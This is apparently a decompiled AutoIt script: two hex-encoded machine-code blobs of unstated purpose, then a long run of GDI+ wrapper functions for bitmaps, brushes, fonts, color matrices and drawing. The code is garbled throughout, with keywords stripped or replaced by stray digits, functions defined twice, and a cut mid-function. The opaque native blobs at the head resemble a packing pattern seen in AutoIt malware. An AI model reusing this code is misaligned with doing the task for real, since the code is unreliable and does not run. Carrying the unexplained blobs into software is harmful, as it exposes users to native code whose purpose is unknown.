$pproc = __init(("0x48894C240848895424104C894424184C894C24205541574831C050504883EC28" & "48837C24600074054831C0EB0748C7C0010000004821C0751B48837C24680074" & "054831C0EB0748C7C0010000004821C07502EB0948C7C001000000EB034831C0" & "4821C074084831C04863C0EB7748C7442428000000004C637C24584983C7FC4C" & "3B7C24287C4F4C8B7C24604C037C24284C897C2430488B6C2430807D00007405" & "4831C0EB0748C7C0010000004821C0741C4C8B7C24684C037C24284983C7034C" & "897C2430488B6C2430C64500FF48834424280471A148C7C0010000004863C0EB" & "034831C04883C438415F5DC3"))

$pproc = __init(("0x555331C05050837C241C00740431C0EB05B80100000021C07516837C24200074" & "0431C0EB05B80100000021C07502EB07B801000000EB0231C021C0740431C0EB" & "5AC70424000000008B5C241883C3FC3B1C247C3E8B5C241C031C24895C24048B" & "6C2404807D0000740431C0EB05B80100000021C074168B5C2420031C2483C303" & "895C24048B6C2404C64500FF8304240471B6B801000000EB0231C083C4085B5D" & "C21000"))


$pproc

__enumdisplaymonitorsproc($hmonitor, $hdc, $prect, $lparam)
__inc($__g_venum)
$__g_venum[$__g_venum[0][0]][0] = $hmonitor
$prect5
$__g_venum[$__g_venum[0][0]][1] = 0

$__g_venum[$__g_venum[0][0]][1] = ($tagrect)
_winapi_movememory(($__g_venum[$__g_venum[0][0]][1]), $prect, 16)5340



__enumfontfamiliesproc($pelfex, $pntmex, $ifonttype, $ppattern)
$telfex = ($taglogfont & ";wchar FullName[64];wchar Style[32];wchar Script[32]", $pelfex)
$tntmex = ($tagnewtextmetricex, $pntmex)
$tpattern = ("uint;uint;ptr", $ppattern)
$ifonttype1($ifonttype, ($tpattern, 1))5


($tpattern, 3)5
$aret = ("shlwapi.dll", "bool", "PathMatchSpecW", "ptr", ($telfex, 14), "ptr", ($tpattern, 3))
@error5
($tpattern, 2)5
$aret[0]5




$aret[0]5






__inc($__g_venum)
$__g_venum[$__g_venum[0][0]][0] = ($telfex, 14)
$__g_venum[$__g_venum[0][0]][1] = ($telfex, 16)
$__g_venum[$__g_venum[0][0]][2] = ($telfex, 15)
$__g_venum[$__g_venum[0][0]][3] = ($telfex, 17)
$__g_venum[$__g_venum[0][0]][4] = $ifonttype
$__g_venum[$__g_venum[0][0]][5] = ($tntmex, 19)
$__g_venum[$__g_venum[0][0]][6] = ($tntmex, 20)
$__g_venum[$__g_venum[0][0]][7] = ($tntmex, 21)


__enumfontstylesproc($pelfex, $pntmex, $ifonttype, $pfn)
$telfex = ($taglogfont & ";wchar FullName[64];wchar Style[32];wchar Script[32]", $pelfex)
$tntmex = ($tagnewtextmetricex, $pntmex)
$tfn = ("dword;wchar[64]", $pfn)
(($tntmex, "ntmFlags"), 97) = ($tfn, 1)5
($tfn, 2, ($telfex, "FullName"))





$__g_hgdipbrush = 0
$__g_hgdipdll = 0
$__g_hgdippen = 0
$__g_igdipref = 0
$__g_igdiptoken = 0
$__g_bgdip_v1_0 = 39
_gdiplus_arrowcapcreate($fheight, $fwidth, $bfilled = 39)
$aresult = ($__g_hgdipdll, "int", "GdipCreateAdjustableArrowCap", "float", $fheight, "float", $fwidth, "bool", $bfilled, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[4]

_gdiplus_arrowcapdispose($hcap)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteCustomLineCap", "handle", $hcap)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_arrowcapgetfillstate($harrowcap)
$aresult = ($__g_hgdipdll, "int", "GdipGetAdjustableArrowCapFillState", "handle", $harrowcap, "bool*", 0)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_arrowcapgetheight($harrowcap)
$aresult = ($__g_hgdipdll, "int", "GdipGetAdjustableArrowCapHeight", "handle", $harrowcap, "float*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_arrowcapgetmiddleinset($harrowcap)
$aresult = ($__g_hgdipdll, "int", "GdipGetAdjustableArrowCapMiddleInset", "handle", $harrowcap, "float*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_arrowcapgetwidth($harrowcap)
$aresult = ($__g_hgdipdll, "int", "GdipGetAdjustableArrowCapWidth", "handle", $harrowcap, "float*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_arrowcapsetfillstate($harrowcap, $bfilled = 39)
$aresult = ($__g_hgdipdll, "int", "GdipSetAdjustableArrowCapFillState", "handle", $harrowcap, "bool", $bfilled)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_arrowcapsetheight($harrowcap, $fheight)
$aresult = ($__g_hgdipdll, "int", "GdipSetAdjustableArrowCapHeight", "handle", $harrowcap, "float", $fheight)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_arrowcapsetmiddleinset($harrowcap, $finset)
$aresult = ($__g_hgdipdll, "int", "GdipSetAdjustableArrowCapMiddleInset", "handle", $harrowcap, "float", $finset)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_arrowcapsetwidth($harrowcap, $fwidth)
$aresult = ($__g_hgdipdll, "int", "GdipSetAdjustableArrowCapWidth", "handle", $harrowcap, "float", $fwidth)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_bitmapclonearea($hbmp, $nleft, $ntop, $nwidth, $nheight, $iformat = 137224)
$aresult = ($__g_hgdipdll, "int", "GdipCloneBitmapArea", "float", $nleft, "float", $ntop, "float", $nwidth, "float", $nheight, "int", $iformat, "handle", $hbmp, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[7]

_gdiplus_bitmapcreatefromfile($sfilename)
$aresult = ($__g_hgdipdll, "int", "GdipCreateBitmapFromFile", "wstr", $sfilename, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_bitmapcreatefromgraphics($iwidth, $iheight, $hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipCreateBitmapFromGraphics", "int", $iwidth, "int", $iheight, "handle", $hgraphics, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[4]

_gdiplus_bitmapcreatefromhbitmap($hbmp, $hpal = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateBitmapFromHBITMAP", "handle", $hbmp, "handle", $hpal, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_bitmapcreatefrommemory($dimage, $bhbitmap = 40)
($dimage)534(1, 0, 0)
$aresult = 0
0$dmembitmap = ($dimage)
0$ilen = ($dmembitmap)
0$gmem_moveable = 2
$aresult = ("kernel32.dll", "handle", "GlobalAlloc", "uint", $gmem_moveable, "ulong_ptr", $ilen)
@error534(4, 0, 0)
0$hdata = $aresult[0]
$aresult = ("kernel32.dll", "ptr", "GlobalLock", "handle", $hdata)
@error534(5, 0, 0)
$tmem = ("byte[" & $ilen & "]", $aresult[0])
($tmem, 1, $dmembitmap)
("kernel32.dll", "bool", "GlobalUnlock", "handle", $hdata)
@error534(6, 0, 0)
0$hstream = _winapi_createstreamonhglobal($hdata)
@error534(2, 0, 0)
0$hbitmap = _gdiplus_bitmapcreatefromstream($hstream)
@error534(3, 0, 0)
("oleaut32.dll", "long", "DispCallFunc", "ptr", $hstream, "ulong_ptr", 8 * (1 + @AutoItX64), "uint", 4, "ushort", 23, "uint", 0, "ptr", 0, "ptr", 0, "str", "")
$bhbitmap5
0$hhbmp = __gdiplus_bitmapcreatedibfrombitmap($hbitmap)
_gdiplus_bitmapdispose($hbitmap)
$hhbmp

$hbitmap

_gdiplus_bitmapcreatefromresource($hinst, $vresourcename)
$stype = "int"
($vresourcename)5$stype = "wstr"
$aresult = ($__g_hgdipdll, "int", "GdipCreateBitmapFromResource", "handle", $hinst, $stype, $vresourcename, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_bitmapcreatefromscan($iwidth, $iheight, $ipixelformat = $gdip_pxf32argb, $istride = 0, $pscan0 = 0)
$aresult = ($__g_hgdipdll, "uint", "GdipCreateBitmapFromScan0", "int", $iwidth, "int", $iheight, "int", $istride, "int", $ipixelformat, "ptr", $pscan0, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[6]

_gdiplus_bitmapcreatefromstream($pstream)
$aresult = ($__g_hgdipdll, "int", "GdipCreateBitmapFromStream", "ptr", $pstream, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_bitmapcreatehbitmapfrombitmap($hbitmap, $iargb = -16777216)
$aresult = ($__g_hgdipdll, "int", "GdipCreateHBITMAPFromBitmap", "handle", $hbitmap, "handle*", 0, "dword", $iargb)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_bitmapdispose($hbitmap)
$aresult = ($__g_hgdipdll, "int", "GdipDisposeImage", "handle", $hbitmap)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_bitmapcreatefromhicon($hicon)
$aresult = ($__g_hgdipdll, "int", "GdipCreateBitmapFromHICON", "handle", $hicon, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_bitmapcreatefromhicon($hicon)
$tsize = _winapi_geticondimension($hicon)
$iwidth = ($tsize, "X")
$iheight = ($tsize, "Y")
$iwidth <= 02$iheight <= 0534(10, -1, 0)
$tbitmapinfo = ("dword Size;long Width;long Height;word Planes;word BitCount;dword Compression;dword SizeImage;long XPelsPerMeter;long YPelsPerMeter;dword ClrUsed;dword ClrImportant;dword RGBQuad")
($tbitmapinfo, "Size", ($tbitmapinfo) - 4)
($tbitmapinfo, "Width", $iwidth)
($tbitmapinfo, "Height", -$iheight)
($tbitmapinfo, "Planes", 1)
($tbitmapinfo, "BitCount", 32)
($tbitmapinfo, "Compression", 0)
($tbitmapinfo, "SizeImage", 0)
$hdc = _winapi_createcompatibledc(0)
$pbits
$hbmp = _winapi_createdibsection(0, $tbitmapinfo, 0, $pbits)
$horig = _winapi_selectobject($hdc, $hbmp)
_winapi_drawiconex($hdc, 0, 0, $hicon, $iwidth, $iheight)
$hbitmapicon = _gdiplus_bitmapcreatefromscan($iwidth, $iheight, $gdip_pxf32argb, $iwidth * 4, $pbits)
$hbitmap = _gdiplus_bitmapcreatefromscan($iwidth, $iheight)
$hcontext = _gdiplus_imagegetgraphicscontext($hbitmap)
_gdiplus_graphicsdrawimage($hcontext, $hbitmapicon, 0, 0)
_gdiplus_graphicsdispose($hcontext)
_gdiplus_bitmapdispose($hbitmapicon)
_winapi_selectobject($hdc, $horig)
_winapi_deletedc($hdc)
_winapi_deleteobject($hbmp)
$hbitmap

_gdiplus_bitmapgetpixel($hbitmap, $ix, $iy)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapGetPixel", "handle", $hbitmap, "int", $ix, "int", $iy, "uint*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[4]

_gdiplus_bitmaplockbits($hbitmap, $ileft, $itop, $iwidth, $iheight, $iflags = $gdip_ilmread, $iformat = $gdip_pxf32rgb)
$tdata = ($taggdipbitmapdata)
$trect = ($tagrect)
($trect, "Left", $ileft)
($trect, "Top", $itop)
($trect, "Right", $iwidth)
($trect, "Bottom", $iheight)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapLockBits", "handle", $hbitmap, "struct*", $trect, "uint", $iflags, "int", $iformat, "struct*", $tdata)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$tdata

_gdiplus_bitmapsetpixel($hbitmap, $ix, $iy, $iargb)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapSetPixel", "handle", $hbitmap, "int", $ix, "int", $iy, "uint", $iargb)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_bitmapunlockbits($hbitmap, $tbitmapdata)
$aresult = ($__g_hgdipdll, "int", "GdipBitmapUnlockBits", "handle", $hbitmap, "struct*", $tbitmapdata)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_brushclone($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipCloneBrush", "handle", $hbrush, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_brushcreatesolid($iargb = -16777216)
$aresult = ($__g_hgdipdll, "int", "GdipCreateSolidFill", "int", $iargb, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_brushdispose($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteBrush", "handle", $hbrush)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_brushgetsolidcolor($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipGetSolidFillColor", "handle", $hbrush, "dword*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_brushgettype($hbrush)
$aresult = ($__g_hgdipdll, "int", "GdipGetBrushType", "handle", $hbrush, "int*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_brushsetsolidcolor($hbrush, $iargb = -16777216)
$aresult = ($__g_hgdipdll, "int", "GdipSetSolidFillColor", "handle", $hbrush, "dword", $iargb)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_colormatrixcreate()
_gdiplus_colormatrixcreatescale(1, 1, 1, 1)

_gdiplus_colormatrixcreategrayscale()
$ii, $ij, $tcm, $alums[4] = [$gdip_rlum, $gdip_glum, $gdip_blum, 0]
$tcm = ($taggdipcolormatrix)
$ii = 0153
$ij = 1153
($tcm, "m", $alums[$ii], $ii * 5 + $ij)


($tcm, "m", 1, 19)
($tcm, "m", 1, 25)
$tcm

_gdiplus_colormatrixcreatenegative()
$ii, $tcm
$tcm = _gdiplus_colormatrixcreatescale(-1, -1, -1, 1)
$ii = 1154
($tcm, "m", 1, 20 + $ii)

$tcm

_gdiplus_colormatrixcreatesaturation($fsat)
$fsatcomp, $tcm
$tcm = ($taggdipcolormatrix)
$fsatcomp = (1 - $fsat)
($tcm, "m", $fsatcomp * $gdip_rlum + $fsat, 1)
($tcm, "m", $fsatcomp * $gdip_rlum, 2)
($tcm, "m", $fsatcomp * $gdip_rlum, 3)
($tcm, "m", $fsatcomp * $gdip_glum, 6)
($tcm, "m", $fsatcomp * $gdip_glum + $fsat, 7)
($tcm, "m", $fsatcomp * $gdip_glum, 8)
($tcm, "m", $fsatcomp * $gdip_blum, 11)
($tcm, "m", $fsatcomp * $gdip_blum, 12)
($tcm, "m", $fsatcomp * $gdip_blum + $fsat, 13)
($tcm, "m", 1, 19)
($tcm, "m", 1, 25)
$tcm

_gdiplus_colormatrixcreatescale($fred, $fgreen, $fblue, $falpha = 1)
$tcm
$tcm = ($taggdipcolormatrix)
($tcm, "m", $fred, 1)
($tcm, "m", $fgreen, 7)
($tcm, "m", $fblue, 13)
($tcm, "m", $falpha, 19)
($tcm, "m", 1, 25)
$tcm

_gdiplus_colormatrixcreatetranslate($fred, $fgreen, $fblue, $falpha = 0)
$ii, $tcm, $afactors[4] = [$fred, $fgreen, $fblue, $falpha]
$tcm = _gdiplus_colormatrixcreate()
$ii = 0153
($tcm, "m", $afactors[$ii], 21 + $ii)

$tcm

_gdiplus_customlinecapclone($hcustomlinecap)
$aresult = ($__g_hgdipdll, "int", "GdipCloneCustomLineCap", "handle", $hcustomlinecap, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]5(10, $aresult[0], 0)
$aresult[2]

_gdiplus_customlinecapcreate($hpathfill, $hpathstroke, $ilinecap = 0, $ibaseinset = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateCustomLineCap", "handle", $hpathfill, "handle", $hpathstroke, "int", $ilinecap, "float", $ibaseinset, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[5]

_gdiplus_customlinecapdispose($hcap)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteCustomLineCap", "handle", $hcap)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_customlinecapgetstrokecaps($hcustomlinecap)
$aresult = ($__g_hgdipdll, "int", "GdipGetCustomLineCapStrokeCaps", "hwnd", $hcustomlinecap, "ptr*", 0, "ptr*", 0)
@error534(@error, @extended, 0)
$aresult[0]5(10, $aresult[0], 0)
$acaps[2]
$acaps[0] = $aresult[2]
$acaps[1] = $aresult[3]
$acaps

_gdiplus_customlinecapsetstrokecaps($hcustomlinecap, $istartcap, $iendcap)
$aresult = ($__g_hgdipdll, "int", "GdipSetCustomLineCapStrokeCaps", "handle", $hcustomlinecap, "int", $istartcap, "int", $iendcap)
@error534(@error, @extended, 40)
$aresult[0]5(10, $aresult[0], 40)
9

_gdiplus_decoders()
$icount = _gdiplus_decodersgetcount()
$isize = _gdiplus_decodersgetsize()
$tbuffer = ("byte[" & $isize & "]")
$aresult = ($__g_hgdipdll, "int", "GdipGetImageDecoders", "uint", $icount, "uint", $isize, "struct*", $tbuffer)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$pbuffer = ($tbuffer)
$tcodec, $ainfo[$icount + 1][14]
$ainfo[0][0] = $icount
$ii = 115$icount
$tcodec = ($taggdipimagecodecinfo, $pbuffer)
$ainfo[$ii][1] = _winapi_stringfromguid(($tcodec, "CLSID"))
$ainfo[$ii][2] = _winapi_stringfromguid(($tcodec, "FormatID"))
$ainfo[$ii][3] = _winapi_widechartomultibyte(($tcodec, "CodecName"))
$ainfo[$ii][4] = _winapi_widechartomultibyte(($tcodec, "DllName"))
$ainfo[$ii][5] = _winapi_widechartomultibyte(($tcodec, "FormatDesc"))
$ainfo[$ii][6] = _winapi_widechartomultibyte(($tcodec, "FileExt"))
$ainfo[$ii][7] = _winapi_widechartomultibyte(($tcodec, "MimeType"))
$ainfo[$ii][8] = ($tcodec, "Flags")
$ainfo[$ii][9] = ($tcodec, "Version")
$ainfo[$ii][10] = ($tcodec, "SigCount")
$ainfo[$ii][11] = ($tcodec, "SigSize")
$ainfo[$ii][12] = ($tcodec, "SigPattern")
$ainfo[$ii][13] = ($tcodec, "SigMask")
$pbuffer += ($tcodec)

$ainfo

_gdiplus_decodersgetcount()
$aresult = ($__g_hgdipdll, "int", "GdipGetImageDecodersSize", "uint*", 0, "uint*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[1]

_gdiplus_decodersgetsize()
$aresult = ($__g_hgdipdll, "int", "GdipGetImageDecodersSize", "uint*", 0, "uint*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_drawimagepoints($hgraphic, $himage, $nulx, $nuly, $nurx, $nury, $nllx, $nlly, $icount = 3)
$tpoint = ("float X;float Y;float X2;float Y2;float X3;float Y3")
($tpoint, "X", $nulx)
($tpoint, "Y", $nuly)
($tpoint, "X2", $nurx)
($tpoint, "Y2", $nury)
($tpoint, "X3", $nllx)
($tpoint, "Y3", $nlly)
$aresult = ($__g_hgdipdll, "int", "GdipDrawImagePoints", "handle", $hgraphic, "handle", $himage, "struct*", $tpoint, "int", $icount)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_encoders()
$icount = _gdiplus_encodersgetcount()
$isize = _gdiplus_encodersgetsize()
$tbuffer = ("byte[" & $isize & "]")
$aresult = ($__g_hgdipdll, "int", "GdipGetImageEncoders", "uint", $icount, "uint", $isize, "struct*", $tbuffer)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$pbuffer = ($tbuffer)
$tcodec, $ainfo[$icount + 1][14]
$ainfo[0][0] = $icount
$ii = 115$icount
$tcodec = ($taggdipimagecodecinfo, $pbuffer)
$ainfo[$ii][1] = _winapi_stringfromguid(($tcodec, "CLSID"))
$ainfo[$ii][2] = _winapi_stringfromguid(($tcodec, "FormatID"))
$ainfo[$ii][3] = _winapi_widechartomultibyte(($tcodec, "CodecName"))
$ainfo[$ii][4] = _winapi_widechartomultibyte(($tcodec, "DllName"))
$ainfo[$ii][5] = _winapi_widechartomultibyte(($tcodec, "FormatDesc"))
$ainfo[$ii][6] = _winapi_widechartomultibyte(($tcodec, "FileExt"))
$ainfo[$ii][7] = _winapi_widechartomultibyte(($tcodec, "MimeType"))
$ainfo[$ii][8] = ($tcodec, "Flags")
$ainfo[$ii][9] = ($tcodec, "Version")
$ainfo[$ii][10] = ($tcodec, "SigCount")
$ainfo[$ii][11] = ($tcodec, "SigSize")
$ainfo[$ii][12] = ($tcodec, "SigPattern")
$ainfo[$ii][13] = ($tcodec, "SigMask")
$pbuffer += ($tcodec)

$ainfo

_gdiplus_encodersgetclsid($sfileext)
$aencoders = _gdiplus_encoders()
@error534(@error, 0, "")
$ii = 115$aencoders[0][0]
($aencoders[$ii][6], "*." & $sfileext) > 0534$aencoders[$ii][1]

(-1, -1, "")

_gdiplus_encodersgetcount()
$aresult = ($__g_hgdipdll, "int", "GdipGetImageEncodersSize", "uint*", 0, "uint*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[1]

_gdiplus_encodersgetparamlist($himage, $sencoder)
$isize = _gdiplus_encodersgetparamlistsize($himage, $sencoder)
@error534(@error + 10, @extended, 0)
$tguid = _winapi_guidfromstring($sencoder)
$tbuffer = ("dword Count;byte Params[" & $isize - 4 & "]")
$aresult = ($__g_hgdipdll, "int", "GdipGetEncoderParameterList", "handle", $himage, "struct*", $tguid, "uint", $isize, "struct*", $tbuffer)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
($taggdippencoderparams, $tbuffer)

_gdiplus_encodersgetparamlistsize($himage, $sencoder)
$tguid = _winapi_guidfromstring($sencoder)
$aresult = ($__g_hgdipdll, "int", "GdipGetEncoderParameterListSize", "handle", $himage, "struct*", $tguid, "uint*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_encodersgetsize()
$aresult = ($__g_hgdipdll, "int", "GdipGetImageEncodersSize", "uint*", 0, "uint*", 0)
@error534(@error, @extended, -1)
$aresult[0]534(10, $aresult[0], -1)
$aresult[2]

_gdiplus_fontcreate($hfamily, $fsize, $istyle = 0, $iunit = 3)
$aresult = ($__g_hgdipdll, "int", "GdipCreateFont", "handle", $hfamily, "float", $fsize, "int", $istyle, "int", $iunit, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[5]

_gdiplus_fontdispose($hfont)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteFont", "handle", $hfont)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_fontfamilycreate($sfamily, $pcollection = 0)
$aresult = ($__g_hgdipdll, "int", "GdipCreateFontFamilyFromName", "wstr", $sfamily, "ptr", $pcollection, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_fontfamilydispose($hfamily)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteFontFamily", "handle", $hfamily)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_fontfamilygetcellascent($hfontfamily, $istyle = 0)
$aresult = ($__g_hgdipdll, "int", "GdipGetCellAscent", "handle", $hfontfamily, "int", $istyle, "ushort*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_fontfamilygetcelldescent($hfontfamily, $istyle = 0)
$aresult = ($__g_hgdipdll, "int", "GdipGetCellDescent", "handle", $hfontfamily, "int", $istyle, "ushort*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_fontfamilygetemheight($hfontfamily, $istyle = 0)
$aresult = ($__g_hgdipdll, "int", "GdipGetEmHeight", "handle", $hfontfamily, "int", $istyle, "ushort*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_fontfamilygetlinespacing($hfontfamily, $istyle = 0)
$aresult = ($__g_hgdipdll, "int", "GdipGetLineSpacing", "handle", $hfontfamily, "int", $istyle, "ushort*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_fontgetheight($hfont, $hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipGetFontHeight", "handle", $hfont, "handle", $hgraphics, "float*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[3]

_gdiplus_graphicsclear($hgraphics, $iargb = -16777216)
$aresult = ($__g_hgdipdll, "int", "GdipGraphicsClear", "handle", $hgraphics, "dword", $iargb)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicscreatefromhdc($hdc)
$aresult = ($__g_hgdipdll, "int", "GdipCreateFromHDC", "handle", $hdc, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_graphicscreatefromhwnd($hwnd)
$aresult = ($__g_hgdipdll, "int", "GdipCreateFromHWND", "hwnd", $hwnd, "handle*", 0)
@error534(@error, @extended, 0)
$aresult[0]534(10, $aresult[0], 0)
$aresult[2]

_gdiplus_graphicsdispose($hgraphics)
$aresult = ($__g_hgdipdll, "int", "GdipDeleteGraphics", "handle", $hgraphics)
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawarc($hgraphics, $nx, $ny, $nwidth, $nheight, $fstartangle, $fsweepangle, $hpen = 0)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawArc", "handle", $hgraphics, "handle", $hpen, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "float", $fstartangle, "float", $fsweepangle)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawbezier($hgraphics, $nx1, $ny1, $nx2, $ny2, $nx3, $ny3, $nx4, $ny4, $hpen = 0)
__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawBezier", "handle", $hgraphics, "handle", $hpen, "float", $nx1, "float", $ny1, "float", $nx2, "float", $ny2, "float", $nx3, "float", $ny3, "float", $nx4, "float", $ny4)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawclosedcurve($hgraphics, $apoints, $hpen = 0)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawClosedCurve", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawclosedcurve($hgraphics, $apoints, $ftension, $hpen = 0)
$ii, $icount, $tpoints, $aresult
__gdiplus_pendefcreate($hpen)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipDrawClosedCurve2", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount, "float", $ftension)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawcurve($hgraphics, $apoints, $hpen = 0)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

__gdiplus_pendefcreate($hpen)
$aresult = ($__g_hgdipdll, "int", "GdipDrawCurve", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount)
__gdiplus_pendefdispose()
@error534(@error, @extended, 40)
$aresult[0]534(10, $aresult[0], 40)
9

_gdiplus_graphicsdrawcurve($hgraphics, $apoints, $ntension, $hpen = 0)
$ii, $icount, $tpoints, $aresult
__gdiplus_pendefcreate($hpen)
$icount = $apoints[0][0]
$tpoints = ("float[" & $icount * 2 & "]")
$ii = 115$icount
($tpoints, 1, $apoints[$ii][0], (($ii - 1) * 2) + 1)
($tpoints, 1, $apoints[$ii][1], (($ii - 1) * 2) + 2)

$aresult = ($__g_hgdipdll, "int", "GdipDrawCurve2", "handle", $hgraphics, "handle", $hpen, "struct*", $tpoints, "int", $icount, "float", $ntension)
